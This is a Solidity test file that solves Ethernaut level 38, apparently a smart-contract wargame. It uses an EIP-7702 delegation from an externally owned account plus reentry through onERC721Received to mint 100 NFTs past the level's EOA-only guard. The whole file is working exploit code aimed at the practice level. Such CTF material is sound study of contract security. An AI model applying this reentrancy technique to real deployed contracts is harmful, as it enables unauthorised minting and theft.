// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level38 {
    function mintNFTEOA() external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
}

// This contract will mint NFTs on behalf of an EOA, using reentry via onERC721Received.
contract MintX {
    // This is the first entry point, called by the EOA.
    function mint(uint256 x, address level38) external {
        // Temporarily store the number of NFTs to mint, and the level38 address.
        assembly {
            tstore(0, sub(x, 1))
            tstore(2, level38)
        }
        // Call the mint function to start the minting process.
        Level38(level38).mintNFTEOA();
    }

    // This function is called when an NFT is received.
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4 ret) {
        ret = this.onERC721Received.selector;
        uint256 x;
        uint256 counter;
        address level38;
        // Load the temporary storage values.
        assembly {
            x := tload(0)
            counter := tload(1)
            level38 := tload(2)
        }
        // If we have not minted enough NFTs yet, mint another by reentering.
        if (counter < x) {
            assembly {
                tstore(1, add(counter, 1))
            }
            Level38(level38).mintNFTEOA();
        }
    }
}

contract Level36Test is EthernautTest {
    function testLevel38() public {
        // This issue with this level is that it assumes that EOAs cannot reenter mintNFTEOA().
        // However, EIP 7702 allows EOAs to sign delegations to contracts.
        // This means we use the onERC721Received reentry method, but from an EOA.
        // This means we can mint as ourselves as many NFTs as the gas limit allows.

        // Lets generate a random EOA for us to use for this level, as if we were using an EOA.
        (address eoa, uint256 eoaKey) = makeAddrAndKey("eoa");

        // We want to create and submit this level as that EOA.
        vm.prank(eoa, eoa);
        _createLevel("38");

        Level38 level38Instance = Level38(levelInstance["38"]);

        // Lets create our MintX contract that will do the minting for us.
        MintX mintX = new MintX();

        // Let sign an 7702 delegation to our MintX contract.
        vm.signAndAttachDelegation(address(mintX), eoaKey);
        // This is a foundry test, so our EOA needs to be msg.sender and tx.origin.
        vm.prank(eoa, eoa);
        // Now call with the eoa, and mint ourselves 100 NFTs.
        (bool ok,) = eoa.call(abi.encodeWithSignature("mint(uint256,address)", 100, address(level38Instance)));

        // Check we minted 100 NFTs.
        require(level38Instance.balanceOf(eoa) == 100, "Did not mint 100 NFTs");

        // We need to submit the level as if we were an EOA, so tx.origin and msg.sender.
        vm.prank(eoa, eoa);
        require(_submitLevel("38"));
    }
}
